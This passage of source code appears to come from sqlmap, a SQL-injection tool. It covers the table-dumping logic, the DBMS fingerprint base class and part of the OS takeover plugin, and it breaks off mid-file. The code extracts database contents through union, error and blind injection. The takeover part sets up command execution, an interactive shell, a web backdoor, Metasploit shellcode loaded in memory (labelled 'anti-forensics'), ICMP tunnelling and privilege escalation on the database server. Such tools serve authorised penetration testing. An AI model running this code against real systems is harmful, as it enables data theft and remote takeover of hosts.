kb.dumpTable = tbl\n                else:\n                    kb.dumpTable = \"%s.%s\" % (conf.db, tbl)\n\n                if safeSQLIdentificatorNaming(conf.db) not in kb.data.cachedColumns or safeSQLIdentificatorNaming(tbl, True) not in kb.data.cachedColumns[safeSQLIdentificatorNaming(conf.db)] or not kb.data.cachedColumns[safeSQLIdentificatorNaming(conf.db)][safeSQLIdentificatorNaming(tbl, True)]:\n                    warnMsg = \"unable to enumerate the columns for table '%s'\" % unsafeSQLIdentificatorNaming(tbl)\n                    if METADB_SUFFIX.upper() not in conf.db.upper():\n                        warnMsg += \" in database '%s'\" % unsafeSQLIdentificatorNaming(conf.db)\n                    warnMsg += \", skipping\" if len(tblList) > 1 else \"\"\n                    logger.warning(warnMsg)\n\n                    continue\n\n                columns = kb.data.cachedColumns[safeSQLIdentificatorNaming(conf.db)][safeSQLIdentificatorNaming(tbl, True)]\n                colList = sorted(column for column in columns if column)\n\n                if conf.exclude:\n                    colList = [_ for _ in colList if re.search(conf.exclude, _, re.I) is None]\n\n                if not colList:\n                    warnMsg = \"skipping table '%s'\" % unsafeSQLIdentificatorNaming(tbl)\n                    if METADB_SUFFIX.upper() not in conf.db.upper():\n                        warnMsg += \" in database '%s'\" % unsafeSQLIdentificatorNaming(conf.db)\n                    warnMsg += \" (no usable column names)\"\n                    logger.warning(warnMsg)\n                    continue\n\n                kb.dumpColumns = [unsafeSQLIdentificatorNaming(_) for _ in colList]\n                colNames = colString = ','.join(column for column in colList)\n                rootQuery = queries[Backend.getIdentifiedDbms()].dump_table\n\n                infoMsg = \"fetching entries\"\n                if conf.col:\n                    infoMsg += \" of column(s) '%s'\" % colNames\n                infoMsg += \" for table '%s'\" % unsafeSQLIdentificatorNaming(tbl)\n                if METADB_SUFFIX.upper() not in conf.db.upper():\n                    infoMsg += \" in database '%s'\" % unsafeSQLIdentificatorNaming(conf.db)\n                logger.info(infoMsg)\n\n                for column in colList:\n                    _ = agent.preprocessField(tbl, column)\n                    if _ != column:\n                        colString = re.sub(r\"\\b%s\\b\" % re.escape(column), _.replace(\"\\\\\", r\"\\\\\"), colString)\n\n                entriesCount = 0\n\n                if any(isTechniqueAvailable(_) for _ in (PAYLOAD.TECHNIQUE.UNION, PAYLOAD.TECHNIQUE.ERROR, PAYLOAD.TECHNIQUE.QUERY)) or conf.direct:\n                    entries = []\n                    query = None\n\n                    if Backend.getIdentifiedDbms() in (DBMS.ORACLE, DBMS.DB2, DBMS.DERBY, DBMS.ALTIBASE, DBMS.MIMERSQL):\n                        query = rootQuery.inband.query % (colString, tbl.upper() if not conf.db else (\"%s.%s\" % (conf.db.upper(), tbl.upper())))\n                    elif Backend.getIdentifiedDbms() in (DBMS.SQLITE, DBMS.ACCESS, DBMS.FIREBIRD, DBMS.MAXDB, DBMS.MCKOI, DBMS.EXTREMEDB, DBMS.RAIMA):\n                        query = rootQuery.inband.query % (colString, tbl)\n                    elif Backend.getIdentifiedDbms() in (DBMS.SYBASE, DBMS.MSSQL):\n                        # Partial inband and error\n                        if not (isTechniqueAvailable(PAYLOAD.TECHNIQUE.UNION) and kb.injection.data[PAYLOAD.TECHNIQUE.UNION].where == PAYLOAD.WHERE.ORIGINAL):\n                            table = \"%s.%s\" % (conf.db, tbl) if conf.db else tbl\n\n                            if Backend.isDbms(DBMS.MSSQL) and not conf.forcePivoting:\n                                warnMsg = \"in case of table dumping problems (e.g. column entry order) \"\n                                warnMsg += \"you are advised to rerun with '--force-pivoting'\"\n                                singleTimeWarnMessage(warnMsg)\n\n                                query = rootQuery.blind.count % table\n                                query = agent.whereQuery(query)\n\n                                count = inject.getValue(query, blind=False, time=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)\n                                if isNumPosStrValue(count):\n                                    try:\n                                        indexRange = getLimitRange(count, plusOne=True)\n\n                                        for index in indexRange:\n                                            row = []\n                                            for column in colList:\n                                                query = rootQuery.blind.query3 % (column, column, table, index)\n                                                query = agent.whereQuery(query)\n                                                value = inject.getValue(query, blind=False, time=False, dump=True) or \"\"\n                                                row.append(value)\n\n                                            if not entries and isNoneValue(row):\n                                                break\n\n                                            entries.append(row)\n\n                                    except KeyboardInterrupt:\n                                        kb.dumpKeyboardInterrupt = True\n                                        clearConsoleLine()\n                                        warnMsg = \"Ctrl+C detected in dumping phase\"\n                                        logger.warning(warnMsg)\n\n                            if isNoneValue(entries) and not kb.dumpKeyboardInterrupt:\n                                try:\n                                    retVal = pivotDumpTable(table, colList, blind=False)\n                                except KeyboardInterrupt:\n                                    retVal = None\n                                    kb.dumpKeyboardInterrupt = True\n                                    clearConsoleLine()\n                                    warnMsg = \"Ctrl+C detected in dumping phase\"\n                                    logger.warning(warnMsg)\n\n                                if retVal:\n                                    entries, _ = retVal\n                                    entries = BigArray(_zip(*[entries[colName] for colName in colList]))\n                        else:\n                            query = rootQuery.inband.query % (colString, conf.db, tbl)\n                    elif Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL, DBMS.HSQLDB, DBMS.H2, DBMS.VERTICA, DBMS.PRESTO, DBMS.CRATEDB, DBMS.CACHE, DBMS.VIRTUOSO, DBMS.CLICKHOUSE):\n                        query = rootQuery.inband.query % (colString, conf.db, tbl, prioritySortColumns(colList)[0])\n                    else:\n                        query = rootQuery.inband.query % (colString, conf.db, tbl)\n\n                    query = agent.whereQuery(query)\n\n                    if not entries and query and not kb.dumpKeyboardInterrupt:\n                        try:\n                            entries = inject.getValue(query, blind=False, time=False, dump=True)\n                        except KeyboardInterrupt:\n                            entries = None\n                            kb.dumpKeyboardInterrupt = True\n                            clearConsoleLine()\n                            warnMsg = \"Ctrl+C detected in dumping phase\"\n                            logger.warning(warnMsg)\n\n                    if not isNoneValue(entries):\n                        if isinstance(entries, six.string_types):\n                            entries = [entries]\n                        elif not isListLike(entries):\n                            entries = []\n\n                        entriesCount = len(entries)\n\n                        for index, column in enumerate(colList):\n                            if column not in kb.data.dumpedTable:\n                                kb.data.dumpedTable[column] = {\"length\": len(column), \"values\": BigArray()}\n\n                            for entry in entries:\n                                if entry is None or len(entry) == 0:\n                                    continue\n\n                                if isinstance(entry, six.string_types):\n                                    colEntry = entry\n                                else:\n                                    colEntry = unArrayizeValue(entry[index]) if index < len(entry) else u''\n\n                                maxLen = max(getConsoleLength(column), getConsoleLength(DUMP_REPLACEMENTS.get(getUnicode(colEntry), getUnicode(colEntry))))\n\n                                if maxLen > kb.data.dumpedTable[column][\"length\"]:\n                                    kb.data.dumpedTable[column][\"length\"] = maxLen\n\n                                kb.data.dumpedTable[column][\"values\"].append(colEntry)\n\n                if not kb.data.dumpedTable and isInferenceAvailable() and not conf.direct:\n                    infoMsg = \"fetching number of \"\n                    if conf.col:\n                        infoMsg += \"column(s) '%s' \" % colNames\n                    infoMsg += \"entries for table '%s' \" % unsafeSQLIdentificatorNaming(tbl)\n                    infoMsg += \"in database '%s'\" % unsafeSQLIdentificatorNaming(conf.db)\n                    logger.info(infoMsg)\n\n                    if Backend.getIdentifiedDbms() in (DBMS.ORACLE, DBMS.DB2, DBMS.DERBY, DBMS.ALTIBASE, DBMS.MIMERSQL):\n                        query = rootQuery.blind.count % (tbl.upper() if not conf.db else (\"%s.%s\" % (conf.db.upper(), tbl.upper())))\n                    elif Backend.getIdentifiedDbms() in (DBMS.SQLITE, DBMS.MAXDB, DBMS.ACCESS, DBMS.FIREBIRD, DBMS.MCKOI, DBMS.EXTREMEDB, DBMS.RAIMA):\n                        query = rootQuery.blind.count % tbl\n                    elif Backend.getIdentifiedDbms() in (DBMS.SYBASE, DBMS.MSSQL):\n                        query = rootQuery.blind.count % (\"%s.%s\" % (conf.db, tbl)) if conf.db else tbl\n                    elif Backend.isDbms(DBMS.INFORMIX):\n                        query = rootQuery.blind.count % (conf.db, tbl)\n                    else:\n                        query = rootQuery.blind.count % (conf.db, tbl)\n\n                    query = agent.whereQuery(query)\n\n                    count = inject.getValue(query, union=False, error=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)\n\n                    lengths = {}\n                    entries = {}\n\n                    if count == 0:\n                        warnMsg = \"table '%s' \" % unsafeSQLIdentificatorNaming(tbl)\n                        warnMsg += \"in database '%s' \" % unsafeSQLIdentificatorNaming(conf.db)\n                        warnMsg += \"appears to be empty\"\n                        logger.warning(warnMsg)\n\n                        for column in colList:\n                            lengths[column] = len(column)\n                            entries[column] = []\n\n                    elif not isNumPosStrValue(count):\n                        warnMsg = \"unable to retrieve the number of \"\n                        if conf.col:\n                            warnMsg += \"column(s) '%s' \" % colNames\n                        warnMsg += \"entries for table '%s' \" % unsafeSQLIdentificatorNaming(tbl)\n                        warnMsg += \"in database '%s'\" % unsafeSQLIdentificatorNaming(conf.db)\n                        logger.warning(warnMsg)\n\n                        continue\n\n                    elif Backend.getIdentifiedDbms() in (DBMS.ACCESS, DBMS.SYBASE, DBMS.MAXDB, DBMS.MSSQL, DBMS.INFORMIX, DBMS.MCKOI, DBMS.RAIMA):\n                        if Backend.getIdentifiedDbms() in (DBMS.ACCESS, DBMS.MCKOI, DBMS.RAIMA):\n                            table = tbl\n                        elif Backend.getIdentifiedDbms() in (DBMS.SYBASE, DBMS.MSSQL, DBMS.MAXDB):\n                            table = \"%s.%s\" % (conf.db, tbl) if conf.db else tbl\n                        elif Backend.isDbms(DBMS.INFORMIX):\n                            table = \"%s:%s\" % (conf.db, tbl) if conf.db else tbl\n\n                        if Backend.isDbms(DBMS.MSSQL) and not conf.forcePivoting:\n                            warnMsg = \"in case of table dumping problems (e.g. column entry order) \"\n                            warnMsg += \"you are advised to rerun with '--force-pivoting'\"\n                            singleTimeWarnMessage(warnMsg)\n\n                            try:\n                                indexRange = getLimitRange(count, plusOne=True)\n\n                                for index in indexRange:\n                                    for column in colList:\n                                        query = rootQuery.blind.query3 % (column, column, table, index)\n                                        query = agent.whereQuery(query)\n\n                                        value = inject.getValue(query, union=False, error=False, dump=True) or \"\"\n\n                                        if column not in lengths:\n                                            lengths[column] = 0\n\n                                        if column not in entries:\n                                            entries[column] = BigArray()\n\n                                        lengths[column] = max(lengths[column], len(DUMP_REPLACEMENTS.get(getUnicode(value), getUnicode(value))))\n                                        entries[column].append(value)\n\n                            except KeyboardInterrupt:\n                                kb.dumpKeyboardInterrupt = True\n                                clearConsoleLine()\n                                warnMsg = \"Ctrl+C detected in dumping phase\"\n                                logger.warning(warnMsg)\n\n                        if not entries and not kb.dumpKeyboardInterrupt:\n                            try:\n                                retVal = pivotDumpTable(table, colList, count, blind=True)\n                            except KeyboardInterrupt:\n                                retVal = None\n                                kb.dumpKeyboardInterrupt = True\n                                clearConsoleLine()\n                                warnMsg = \"Ctrl+C detected in dumping phase\"\n                                logger.warning(warnMsg)\n\n                            if retVal:\n                                entries, lengths = retVal\n\n                    else:\n                        emptyColumns = []\n                        plusOne = Backend.getIdentifiedDbms() in PLUS_ONE_DBMSES\n                        indexRange = getLimitRange(count, plusOne=plusOne)\n\n                        if len(colList) < len(indexRange) > CHECK_ZERO_COLUMNS_THRESHOLD:\n                            debugMsg = \"checking for empty columns\"\n                            logger.debug(infoMsg)\n\n                            for column in colList:\n                                if not inject.checkBooleanExpression(\"(SELECT COUNT(%s) FROM %s)>0\" % (column, kb.dumpTable)):\n                                    emptyColumns.append(column)\n                                    debugMsg = \"column '%s' of table '%s' will not be \" % (column, kb.dumpTable)\n                                    debugMsg += \"dumped as it appears to be empty\"\n                                    logger.debug(debugMsg)\n\n                        try:\n                            for index in indexRange:\n                                for column in colList:\n                                    value = \"\"\n\n                                    if column not in lengths:\n                                        lengths[column] = 0\n\n                                    if column not in entries:\n                                        entries[column] = BigArray()\n\n                                    if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL, DBMS.HSQLDB, DBMS.H2, DBMS.VERTICA, DBMS.PRESTO, DBMS.CRATEDB, DBMS.CACHE, DBMS.CLICKHOUSE):\n                                        query = rootQuery.blind.query % (agent.preprocessField(tbl, column), conf.db, conf.tbl, sorted(colList, key=len)[0], index)\n                                    elif Backend.getIdentifiedDbms() in (DBMS.ORACLE, DBMS.DB2, DBMS.DERBY, DBMS.ALTIBASE,):\n                                        query = rootQuery.blind.query % (agent.preprocessField(tbl, column), tbl.upper() if not conf.db else (\"%s.%s\" % (conf.db.upper(), tbl.upper())), index)\n                                    elif Backend.getIdentifiedDbms() in (DBMS.MIMERSQL,):\n                                        query = rootQuery.blind.query % (agent.preprocessField(tbl, column), tbl.upper() if not conf.db else (\"%s.%s\" % (conf.db.upper(), tbl.upper())), sorted(colList, key=len)[0], index)\n                                    elif Backend.getIdentifiedDbms() in (DBMS.SQLITE, DBMS.EXTREMEDB):\n                                        query = rootQuery.blind.query % (agent.preprocessField(tbl, column), tbl, index)\n                                    elif Backend.isDbms(DBMS.FIREBIRD):\n                                        query = rootQuery.blind.query % (index, agent.preprocessField(tbl, column), tbl)\n                                    elif Backend.getIdentifiedDbms() in (DBMS.INFORMIX, DBMS.VIRTUOSO):\n                                        query = rootQuery.blind.query % (index, agent.preprocessField(tbl, column), conf.db, tbl, sorted(colList, key=len)[0])\n                                    elif Backend.isDbms(DBMS.FRONTBASE):\n                                        query = rootQuery.blind.query % (index, agent.preprocessField(tbl, column), conf.db, tbl)\n                                    else:\n                                        query = rootQuery.blind.query % (agent.preprocessField(tbl, column), conf.db, tbl, index)\n\n                                    query = agent.whereQuery(query)\n\n                                    value = NULL if column in emptyColumns else inject.getValue(query, union=False, error=False, dump=True)\n                                    value = '' if value is None else value\n\n                                    lengths[column] = max(lengths[column], len(DUMP_REPLACEMENTS.get(getUnicode(value), getUnicode(value))))\n                                    entries[column].append(value)\n\n                        except KeyboardInterrupt:\n                            kb.dumpKeyboardInterrupt = True\n                            clearConsoleLine()\n                            warnMsg = \"Ctrl+C detected in dumping phase\"\n                            logger.warning(warnMsg)\n\n                    for column, columnEntries in entries.items():\n                        length = max(lengths[column], len(column))\n\n                        kb.data.dumpedTable[column] = {\"length\": length, \"values\": columnEntries}\n\n                        entriesCount = len(columnEntries)\n\n                if len(kb.data.dumpedTable) == 0 or (entriesCount == 0 and kb.permissionFlag):\n                    warnMsg = \"unable to retrieve the entries \"\n                    if conf.col:\n                        warnMsg += \"of columns '%s' \" % colNames\n                    warnMsg += \"for table '%s' \" % unsafeSQLIdentificatorNaming(tbl)\n                    warnMsg += \"in database '%s'%s\" % (unsafeSQLIdentificatorNaming(conf.db), \" (permission denied)\" if kb.permissionFlag else \"\")\n                    logger.warning(warnMsg)\n                else:\n                    kb.data.dumpedTable[\"__infos__\"] = {\"count\": entriesCount,\n                                                        \"table\": safeSQLIdentificatorNaming(tbl, True),\n                                                        \"db\": safeSQLIdentificatorNaming(conf.db)}\n                    try:\n                        attackDumpedTable()\n                    except (IOError, OSError) as ex:\n                        errMsg = \"an error occurred while attacking \"\n                        errMsg += \"table dump ('%s')\" % getSafeExString(ex)\n                        logger.critical(errMsg)\n                    conf.dumper.dbTableValues(kb.data.dumpedTable)\n\n            except SqlmapConnectionException as ex:\n                errMsg = \"connection exception detected in dumping phase \"\n                errMsg += \"('%s')\" % getSafeExString(ex)\n                logger.critical(errMsg)\n\n            finally:\n                kb.dumpColumns = None\n                kb.dumpTable = None\n\n    def dumpAll(self):\n        if conf.db is not None and conf.tbl is None:\n            self.dumpTable()\n            return\n\n        if Backend.isDbms(DBMS.MYSQL) and not kb.data.has_information_schema:\n            errMsg = \"information_schema not available, \"\n            errMsg += \"back-end DBMS is MySQL < 5.0\"\n            raise SqlmapUnsupportedFeatureException(errMsg)\n\n        infoMsg = \"sqlmap will dump entries of all tables from all databases now\"\n        logger.info(infoMsg)\n\n        conf.tbl = None\n        conf.col = None\n\n        self.getTables()\n\n        if kb.data.cachedTables:\n            if isinstance(kb.data.cachedTables, list):\n                kb.data.cachedTables = {None: kb.data.cachedTables}\n\n            for db, tables in kb.data.cachedTables.items():\n                conf.db = db\n\n                for table in tables:\n                    if conf.exclude and re.search(conf.exclude, table, re.I) is not None:\n                        infoMsg = \"skipping table '%s'\" % unsafeSQLIdentificatorNaming(table)\n                        logger.info(infoMsg)\n                        continue\n\n                    try:\n                        conf.tbl = table\n                        kb.data.cachedColumns = {}\n                        kb.data.dumpedTable = {}\n\n                        self.dumpTable()\n                    except SqlmapNoneDataException:\n                        infoMsg = \"skipping table '%s'\" % unsafeSQLIdentificatorNaming(table)\n                        logger.info(infoMsg)\n\n    def dumpFoundColumn(self, dbs, foundCols, colConsider):\n        message = \"do you want to dump found column(s) entries? [Y/n] \"\n\n        if not readInput(message, default='Y', boolean=True):\n            return\n\n        dumpFromDbs = []\n        message = \"which database(s)?\\n[a]ll (default)\\n\"\n\n        for db, tblData in dbs.items():\n            if tblData:\n                message += \"[%s]\\n\" % unsafeSQLIdentificatorNaming(db)\n\n        message += \"[q]uit\"\n        choice = readInput(message, default='a')\n\n        if not choice or choice in ('a', 'A'):\n            dumpFromDbs = list(dbs.keys())\n        elif choice in ('q', 'Q'):\n            return\n        else:\n            dumpFromDbs = choice.replace(\" \", \"\").split(',')\n\n        for db, tblData in dbs.items():\n            if db not in dumpFromDbs or not tblData:\n                continue\n\n            conf.db = db\n            dumpFromTbls = []\n            message = \"which table(s) of database '%s'?\\n\" % unsafeSQLIdentificatorNaming(db)\n            message += \"[a]ll (default)\\n\"\n\n            for tbl in tblData:\n                message += \"[%s]\\n\" % tbl\n\n            message += \"[s]kip\\n\"\n            message += \"[q]uit\"\n            choice = readInput(message, default='a')\n\n            if not choice or choice in ('a', 'A'):\n                dumpFromTbls = tblData\n            elif choice in ('s', 'S'):\n                continue\n            elif choice in ('q', 'Q'):\n                return\n            else:\n                dumpFromTbls = choice.replace(\" \", \"\").split(',')\n\n            for table, columns in tblData.items():\n                if table not in dumpFromTbls:\n                    continue\n\n                conf.tbl = table\n                colList = [_ for _ in columns if _]\n\n                if conf.exclude:\n                    colList = [_ for _ in colList if re.search(conf.exclude, _, re.I) is None]\n\n                conf.col = ','.join(colList)\n                kb.data.cachedColumns = {}\n                kb.data.dumpedTable = {}\n\n                data = self.dumpTable(dbs)\n\n                if data:\n                    conf.dumper.dbTableValues(data)\n\n    def dumpFoundTables(self, tables):\n        message = \"do you want to dump found table(s) entries? [Y/n] \"\n\n        if not readInput(message, default='Y', boolean=True):\n            return\n\n        dumpFromDbs = []\n        message = \"which database(s)?\\n[a]ll (default)\\n\"\n\n        for db, tablesList in tables.items():\n            if tablesList:\n                message += \"[%s]\\n\" % unsafeSQLIdentificatorNaming(db)\n\n        message += \"[q]uit\"\n        choice = readInput(message, default='a')\n\n        if not choice or choice.lower() == 'a':\n            dumpFromDbs = list(tables.keys())\n        elif choice.lower() == 'q':\n            return\n        else:\n            dumpFromDbs = choice.replace(\" \", \"\").split(',')\n\n        for db, tablesList in tables.items():\n            if db not in dumpFromDbs or not tablesList:\n                continue\n\n            conf.db = db\n            dumpFromTbls = []\n            message = \"which table(s) of database '%s'?\\n\" % unsafeSQLIdentificatorNaming(db)\n            message += \"[a]ll (default)\\n\"\n\n            for tbl in tablesList:\n                message += \"[%s]\\n\" % unsafeSQLIdentificatorNaming(tbl)\n\n            message += \"[s]kip\\n\"\n            message += \"[q]uit\"\n            choice = readInput(message, default='a')\n\n            if not choice or choice.lower() == 'a':\n                dumpFromTbls = tablesList\n            elif choice.lower() == 's':\n                continue\n            elif choice.lower() == 'q':\n                return\n            else:\n                dumpFromTbls = choice.replace(\" \", \"\").split(',')\n\n            for table in dumpFromTbls:\n                conf.tbl = table\n                kb.data.cachedColumns = {}\n                kb.data.dumpedTable = {}\n\n                data = self.dumpTable()\n\n                if data:\n                    conf.dumper.dbTableValues(data)\n", "plugins/generic/fingerprint.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.common import Backend\nfrom lib.core.common import readInput\nfrom lib.core.data import logger\nfrom lib.core.enums import OS\nfrom lib.core.exception import SqlmapUndefinedMethod\n\nclass Fingerprint(object):\n    \"\"\"\n    This class defines generic fingerprint functionalities for plugins.\n    \"\"\"\n\n    def __init__(self, dbms):\n        Backend.forceDbms(dbms)\n\n    def getFingerprint(self):\n        errMsg = \"'getFingerprint' method must be defined \"\n        errMsg += \"into the specific DBMS plugin\"\n        raise SqlmapUndefinedMethod(errMsg)\n\n    def checkDbms(self):\n        errMsg = \"'checkDbms' method must be defined \"\n        errMsg += \"into the specific DBMS plugin\"\n        raise SqlmapUndefinedMethod(errMsg)\n\n    def checkDbmsOs(self, detailed=False):\n        errMsg = \"'checkDbmsOs' method must be defined \"\n        errMsg += \"into the specific DBMS plugin\"\n        raise SqlmapUndefinedMethod(errMsg)\n\n    def forceDbmsEnum(self):\n        pass\n\n    def userChooseDbmsOs(self):\n        warnMsg = \"for some reason sqlmap was unable to fingerprint \"\n        warnMsg += \"the back-end DBMS operating system\"\n        logger.warning(warnMsg)\n\n        msg = \"do you want to provide the OS? [(W)indows/(l)inux]\"\n\n        while True:\n            os = readInput(msg, default='W').upper()\n\n            if os == 'W':\n                Backend.setOs(OS.WINDOWS)\n                break\n            elif os == 'L':\n                Backend.setOs(OS.LINUX)\n                break\n            else:\n                warnMsg = \"invalid value\"\n                logger.warning(warnMsg)\n", "plugins/generic/takeover.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport os\n\nfrom lib.core.common import Backend\nfrom lib.core.common import getSafeExString\nfrom lib.core.common import isDigit\nfrom lib.core.common import isStackingAvailable\nfrom lib.core.common import openFile\nfrom lib.core.common import readInput\nfrom lib.core.common import runningAsAdmin\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.enums import DBMS\nfrom lib.core.enums import OS\nfrom lib.core.exception import SqlmapFilePathException\nfrom lib.core.exception import SqlmapMissingDependence\nfrom lib.core.exception import SqlmapMissingMandatoryOptionException\nfrom lib.core.exception import SqlmapMissingPrivileges\nfrom lib.core.exception import SqlmapNotVulnerableException\nfrom lib.core.exception import SqlmapSystemException\nfrom lib.core.exception import SqlmapUndefinedMethod\nfrom lib.core.exception import SqlmapUnsupportedDBMSException\nfrom lib.takeover.abstraction import Abstraction\nfrom lib.takeover.icmpsh import ICMPsh\nfrom lib.takeover.metasploit import Metasploit\nfrom lib.takeover.registry import Registry\n\nclass Takeover(Abstraction, Metasploit, ICMPsh, Registry):\n    \"\"\"\n    This class defines generic OS takeover functionalities for plugins.\n    \"\"\"\n\n    def __init__(self):\n        self.cmdTblName = (\"%soutput\" % conf.tablePrefix)\n        self.tblField = \"data\"\n\n        Abstraction.__init__(self)\n\n    def osCmd(self):\n        if isStackingAvailable() or conf.direct:\n            web = False\n        elif not isStackingAvailable() and Backend.isDbms(DBMS.MYSQL):\n            infoMsg = \"going to use a web backdoor for command execution\"\n            logger.info(infoMsg)\n\n            web = True\n        else:\n            errMsg = \"unable to execute operating system commands via \"\n            errMsg += \"the back-end DBMS\"\n            raise SqlmapNotVulnerableException(errMsg)\n\n        self.getRemoteTempPath()\n        self.initEnv(web=web)\n\n        if not web or (web and self.webBackdoorUrl is not None):\n            self.runCmd(conf.osCmd)\n\n        if not conf.osShell and not conf.osPwn and not conf.cleanup:\n            self.cleanup(web=web)\n\n    def osShell(self):\n        if isStackingAvailable() or conf.direct:\n            web = False\n        elif not isStackingAvailable() and Backend.isDbms(DBMS.MYSQL):\n            infoMsg = \"going to use a web backdoor for command prompt\"\n            logger.info(infoMsg)\n\n            web = True\n        else:\n            errMsg = \"unable to prompt for an interactive operating \"\n            errMsg += \"system shell via the back-end DBMS because \"\n            errMsg += \"stacked queries SQL injection is not supported\"\n            raise SqlmapNotVulnerableException(errMsg)\n\n        self.getRemoteTempPath()\n\n        try:\n            self.initEnv(web=web)\n        except SqlmapFilePathException:\n            if not web and not conf.direct:\n                infoMsg = \"falling back to web backdoor method...\"\n                logger.info(infoMsg)\n\n                web = True\n                kb.udfFail = True\n\n                self.initEnv(web=web)\n            else:\n                raise\n\n        if not web or (web and self.webBackdoorUrl is not None):\n            self.shell()\n\n        if not conf.osPwn and not conf.cleanup:\n            self.cleanup(web=web)\n\n    def osPwn(self):\n        goUdf = False\n        fallbackToWeb = False\n        setupSuccess = False\n\n        self.checkDbmsOs()\n\n        if Backend.isOs(OS.WINDOWS):\n            msg = \"how do you want to establish the tunnel?\"\n            msg += \"\\n[1] TCP: Metasploit Framework (default)\"\n            msg += \"\\n[2] ICMP: icmpsh - ICMP tunneling\"\n\n            while True:\n                tunnel = readInput(msg, default='1')\n\n                if isDigit(tunnel) and int(tunnel) in (1, 2):\n                    tunnel = int(tunnel)\n                    break\n\n                else:\n                    warnMsg = \"invalid value, valid values are '1' and '2'\"\n                    logger.warning(warnMsg)\n        else:\n            tunnel = 1\n\n            debugMsg = \"the tunnel can be established only via TCP when \"\n            debugMsg += \"the back-end DBMS is not Windows\"\n            logger.debug(debugMsg)\n\n        if tunnel == 2:\n            isAdmin = runningAsAdmin()\n\n            if not isAdmin:\n                errMsg = \"you need to run sqlmap as an administrator \"\n                errMsg += \"if you want to establish an out-of-band ICMP \"\n                errMsg += \"tunnel because icmpsh uses raw sockets to \"\n                errMsg += \"sniff and craft ICMP packets\"\n                raise SqlmapMissingPrivileges(errMsg)\n\n            try:\n                __import__(\"impacket\")\n            except ImportError:\n                errMsg = \"sqlmap requires 'python-impacket' third-party library \"\n                errMsg += \"in order to run icmpsh master. You can get it at \"\n                errMsg += \"https://github.com/SecureAuthCorp/impacket\"\n                raise SqlmapMissingDependence(errMsg)\n\n            filename = \"/proc/sys/net/ipv4/icmp_echo_ignore_all\"\n\n            if os.path.exists(filename):\n                try:\n                    with openFile(filename, \"wb\") as f:\n                        f.write(\"1\")\n                except IOError as ex:\n                    errMsg = \"there has been a file opening/writing error \"\n                    errMsg += \"for filename '%s' ('%s')\" % (filename, getSafeExString(ex))\n                    raise SqlmapSystemException(errMsg)\n            else:\n                errMsg = \"you need to disable ICMP replies by your machine \"\n                errMsg += \"system-wide. For example run on Linux/Unix:\\n\"\n                errMsg += \"# sysctl -w net.ipv4.icmp_echo_ignore_all=1\\n\"\n                errMsg += \"If you miss doing that, you will receive \"\n                errMsg += \"information from the database server and it \"\n                errMsg += \"is unlikely to receive commands sent from you\"\n                logger.error(errMsg)\n\n            if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):\n                self.sysUdfs.pop(\"sys_bineval\")\n\n        self.getRemoteTempPath()\n\n        if isStackingAvailable() or conf.direct:\n            web = False\n\n            self.initEnv(web=web)\n\n            if tunnel == 1:\n                if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):\n                    msg = \"how do you want to execute the Metasploit shellcode \"\n                    msg += \"on the back-end database underlying operating system?\"\n                    msg += \"\\n[1] Via UDF 'sys_bineval' (in-memory way, anti-forensics, default)\"\n                    msg += \"\\n[2] Via 'shellcodeexec' (file system way, preferred on 64-bit systems)\"\n\n                    while True:\n                        choice = readInput(msg, default='1')\n\n                        if isDigit(choice) and int(choice) in (1, 2):\n                            choice = int(choice)\n                            break\n\n                        else:\n                            warnMsg = \"invalid value, valid values are '1' and '2'\"\n                            logger.warning(warnMsg)\n\n                    if choice == 1:\n                        goUdf = True\n\n                if goUdf:\n                    exitfunc = \"thread\"\n                    setupSuccess = True\n                else:\n                    exitfunc = \"process\"\n\n                self.createMsfShellcode(exitfunc=exitfunc, format=\"raw\", extra=\"BufferRegister=EAX\", encode=\"x86/alpha_mixed\")\n\n                if not goUdf:\n                    setupSuccess = self.uploadShellcodeexec(web=web)\n\n                    if setupSuccess is not True:\n                        if Backend.isDbms(DBMS.MYSQL):\n                            fallbackToWeb = True\n                        else:\n                            msg = \"unable to mount the operating system takeover\"\n                            raise SqlmapFilePathException(msg)\n\n                if Backend.isOs(OS.WINDOWS) and Backend.isDbms(DBMS.MYSQL) and conf.privEsc:\n                    debugMsg = \"by default MySQL on Windows runs as SYSTEM \"\n                    debugMsg += \"user, no need to privilege escalate\"\n                    logger.debug(debugMsg)\n\n            elif tunnel == 2:\n                setupSuccess = self.uploadIcmpshSlave(web=web)\n\n                if setupSuccess is not True:\n                    if Backend.isDbms(DBMS.MYSQL):\n                        fallbackToWeb = True\n                    else:\n                        msg = \"unable to mount the operating system takeover\"\n                        raise SqlmapFilePathException(msg)\n\n        if not setupSuccess and Backend.isDbms(DBMS.MYSQL) and not conf.direct and (not isStackingAvailable() or fallbackToWeb):\n            web = True\n\n            if fallbackToWeb:\n                infoMsg = \"falling back to web backdoor to establish the tunnel\"\n            else:\n                infoMsg = \"going to use a web backdoor to establish the tunnel\"\n            logger.info(infoMsg)\n\n            self.initEnv(web=web, forceInit=fallbackToWeb)\n\n            if self.webBackdoorUrl:\n                if not Backend.isOs(OS.WINDOWS) and conf.privEsc:\n                    # Unset --priv-esc if the back-end DBMS underlying operating\n                    # system is not Windows\n                    conf.privEsc = False\n\n                    warnMsg = \"sqlmap does not implement any operating system \"\n                    warnMsg += \"user privilege escalation technique when the \"\n                    warnMsg += \"back-end DBMS underlying system is not Windows\"\n                    logger.warning(warnMsg)\n\n                if tunnel == 1:\n                    self.createMsfShellcode(exitfunc=\"process\", format=\"raw\", extra=\"BufferRegister=EAX\", encode=\"x86/alpha_mixed\")\n                    setupSuccess = self.uploadShellcodeexec(web=web)\n\n                    if setupSuccess is not True:\n                        msg = \"unable to mount the operating system takeover\"\n                        raise SqlmapFilePathException(msg)\n\n                elif tunnel == 2:\n                    setupSuccess = self.uploadIcmpshSlave(web=web)\n\n                  